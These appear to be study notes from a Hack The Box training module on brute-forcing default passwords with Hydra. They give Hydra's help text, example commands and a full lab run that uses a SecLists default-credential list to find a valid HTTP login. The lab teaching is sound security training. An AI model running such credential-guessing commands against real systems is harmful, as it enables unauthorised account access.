## Table of Contents

  - [Defualt Passwords](#Defualt\Passwords)
    - [Tooling](#Tooling)
      - [Hydra](#Hydra)


#Hydra #bruteforce
## Defualt Passwords
- Most common 
- Easy to rmemeber
- Intended to simplify acces in most cases
- Uncommon for such to be overlooker



### Tooling


#### Hydra
```bash
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
<...SNIP...>
  -s PORT   if the service is on a different default port, define it here
  
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  
  -u        loop around users, not passwords (effective! implied with -x)
  
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)



  service   the service to crack (see below for supported protocols)

<...SNIP...>

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

https://github.com/danielmiessler/SecLists

We can find a list of default password login pairs in the [SecLists](https://github.com/danielmiessler/SecLists) repository as well, specifically in the `/opt/useful/SecLists/Passwords/Default-Credentials` directory within Pwnbox. In this case, we will pick `ftp-betterdefaultpasslist.txt` as it seems to be the most relevant to our case since it contains a variety of default user/password combinations. We will be using the following flags, based on help page above:

|**Options**|**Description**|
|---|---|
|`-C ftp-betterdefaultpasslist.txt`|Combined Credentials Wordlist|
|`SERVER_IP`|Target IP|
|`-s PORT`|Target Port|
|`http-get`|Request Method|
|`/`|Target Path|


```shell-session
gdxqpardo@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```



